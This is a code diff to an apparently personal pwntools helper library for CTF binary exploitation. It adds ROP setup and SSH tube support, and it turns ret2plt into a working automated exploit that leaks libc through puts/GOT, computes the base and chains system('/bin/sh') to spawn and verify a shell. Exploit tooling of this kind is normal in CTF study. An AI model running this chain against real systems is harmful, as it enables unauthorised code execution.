@@ -208,7 +208,9 @@ def init(
 	argv: list = None,
 	libc_path: str = None,
 	aslr: bool = False,
-	get_libc: bool = True
+	get_libc: bool = True,
+	setup_rop: bool = False,
+	setup_libc_rop: bool = False
 ):
 	import importlib
 	global io, exe, cleaned_exe, libc, elf, ctype_libc
@@ -217,11 +219,11 @@ def init(
 	cleaned_exe = exe[0] # actual file name
 	elf         = context.binary = ELF(cleaned_exe)
 	if get_libc and elf.get_section_by_name('.dynamic'):
-		libc        = elf.libc if not libc_path else ELF(libc_path)
+		libc = elf.libc if not libc_path else ELF(libc_path)
 		try:
-			ctype_libc  = cdll.LoadLibrary(libc.path)
+			ctype_libc = cdll.LoadLibrary(libc.path)
 		except:
-			ctype_libc  = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
+			ctype_libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
 
 	io = get_ctx(aslr=aslr)
 
@@ -235,6 +237,18 @@ def init(
 		caller_globals.update({'libc': libc, 'ctype_libc': ctype_libc})
 		rt.append(libc)
 
+	if setup_rop:
+		rop = ROP(elf)
+		caller_globals.update({'rop': rop})
+		sys.modules[__name__].__dict__.update({'rop': rop})
+		rt.append(rop)
+
+	if get_libc and setup_libc_rop:
+		rop_libc = ROP(libc)
+		caller_globals.update({'rop_libc': rop_libc})
+		sys.modules[__name__].__dict__.update({'rop_libc': rop_libc})
+		rt.append(rop_libc)
+
 	return rt
 
 """
@@ -242,6 +256,8 @@ Custom methods to be added to the pwnlib.tubes.*.* classes
 """
 @add_method(pwnlib.tubes.process.process)
 @add_method(pwnlib.tubes.remote.remote)
+@add_method(pwnlib.tubes.ssh.ssh)
+@add_method(pwnlib.tubes.ssh.ssh_process)
 def recvafter(
 	self,
 	delim: bytes,
@@ -254,19 +270,104 @@ def recvafter(
 	return self.recv(n, timeout=timeout) if n else \
 		self.recvline(keepends=keepends, timeout=timeout)
 
+@add_method(pwnlib.tubes.process.process)
+@add_method(pwnlib.tubes.remote.remote)
+@add_method(pwnlib.tubes.ssh.ssh)
+@add_method(pwnlib.tubes.ssh.ssh_process)
+def recvafteruntil(
+	self,
+	delim_before: bytes,
+	delim_after: bytes = b"\n",
+	drop: bool = True,
+	timeout: int = pwnlib.timeout.maximum
+):
+	self.recvuntil(encode(delim_before), drop=drop, timeout=timeout)
+	return self.recvuntil(encode(delim_after), drop=drop, timeout=timeout)
+
 """
-# Will definitely re-think this later
+The only reason I am creating classes is because
+if I don't do that, the default parameters would fail
+because elf wouldn't be set and it would fail on .{got,plt}
+"""
+class elf:
+	class got: puts = None
+	class sym: main = None
+	class plt: puts = None
+
 def ret2plt(
 	offset: int,
-	got_fn: int = elf.got.puts,
-	plt_fn: int = elf.plt.puts,
-	ret_fn: int = elf.sym.main,
-	rets: int = 0x1,
-	sendafter: bytes = b"\n",
-	send: bool = True,
-	sendline: bool = True,
+	got_fn: int       = elf.got.puts,
+	plt_fn: int       = elf.plt.puts,
+	ret_fn: int       = elf.sym.main,
+	got_fn_name: str  = 'puts',
+	rets: int         = 0x1,
+	sendafter: bytes  = b"\n",
+	postfix: bytes    = None,
+	sendline: bool    = True,
+	getshell: bool    = True,
 	_io: pwnlib.tubes = None,
-):
+) -> int:
+
+	"""
+	ret2plt - Performs rop automatically to get libc leak and
+				attempts to spawn a shell.
+
+	offset: int [ REQUIRED ]
+		The offset at which we control RIP.
+
+	got_fn: int
+		The GOT entry which we want to leak from libc.
+		Default: puts
+
+	plt_fn: int
+		The PLT entry with which got_fn will be passed in RDI.
+		Default: puts
+
+	ret_fn: int
+		The function which will be invoked directly after the plt_fn
+		Default: main
+
+	got_fn_name: str
+		The name of the GOT function leaked (required to calculte base.)
+		Default: "puts"
+
+	rets: int
+		The number of RETs added for stack-alignment
+			For system("/bin/sh"), there will always be -1 added to rets
+			to keep the stack aligned.
+		Default: 0x1
+
+	sendafter: bytes
+		The delimiter after which payload will be sent.
+		Default: NEWLINE
+
+	postfix: bytes
+		The delimiter after which is the libc leak. Usually end-remarks.
+		Default: None
+
+	sendline: bool
+		Whether to send a newline with the payload or not.
+		If true, uses io.sendlineafter else io.sendafter
+		Default: True
+
+	getshell: bool
+		If set, it will use the rop chain to call 'system("/bin/sh")'
+		to spawn a shell and will also validate if the shell works.
+		Default: True
+
+	_io: pwnlib.tubes
+		Used in scenario if the base pwnlib.tubes.*.* is not io but
+		something else. It will be validated as well.
+		Default: None
+			(uses underlying io that was created when "init" was invoked)
+	"""
+
+	global libc, rop
+
+	got_fn = elf.got.puts if not got_fn else got_fn
+	plt_fn = elf.plt.puts if not plt_fn else plt_fn
+	ret_fn = elf.sym.main if not ret_fn else ret_fn
+
 	io = validate_tube(_io)
 	rop = ROP(elf)
 	payload = flat(
@@ -275,14 +376,43 @@ def ret2plt(
 		got_fn,
 		plt_fn,
 		p64(rop.ret.address)*rets,
-		ret_fn
+		ret_fn)
+	(io.sendlineafter if sendline else io.sendafter)(
+		encode(sendafter), payload
 	)
-	if send:
-		(io.sendlineafter if sendline else io.sendafter)(
-			encode(sendafter), payload
-		)
-	return payload
-"""
+	libc_fn = libc.symbols.get(got_fn_name, None)
+	if not libc_fn:
+		error(f"{got_fn_name} is not a valid function in libc!")
+	try:
+		if postfix:
+			io.recvuntil(encode(postfix))
+		libc.address = fixleak(io.recv(6)) - libc.symbols[got_fn_name]
+		if libc.address & 0xFFF != 0:
+			error("Didn't get proper libc base. Please check if the libc used is correct with the binary itself!\nDEBUG: Got leak: %#x" % libc.address)
+	except:
+		error("There might have been some stack alignment issue. Please debug.")
+
+	if getshell:
+		logleak(libc.address)
+		payload = flat(
+			cyclic(offset, n=8),
+			rop.rdi.address,
+			next(libc.search(b"/bin/sh")),
+			p64(rop.ret.address)*(rets+1), # there's always one more required here.
+			libc.sym.system)
+		try:
+			(io.sendlineafter if sendline else io.sendafter)(
+				encode(sendafter), payload)
+			io.sendline(b"echo 'theflash2k'")
+			io.recvuntil(b"theflash2k\n")
+		except:
+			error("There might have been some stack alignment issue. Please debug.")
+		# Got shell:
+		success("Got shell!")
+		io.sendline(b"id")
+		io.interactive()
+
+	return libc.address
 
 """
 These functions are for challenges where we have to
@@ -296,12 +426,12 @@ except:
 def libc_srand(seed: int = ctype_libc.time(0x0)):
 	if ctype_libc:
 		return ctype_libc.srand(seed)
-	return None
+	error("ctype_libc is not initialized!")
 
 def libc_rand():
 	if ctype_libc:
 		return ctype_libc.rand()
-	return None
+	error("ctype_libc is not initialized!")
 
 def logleak(var):
 	frame = inspect.currentframe().f_back
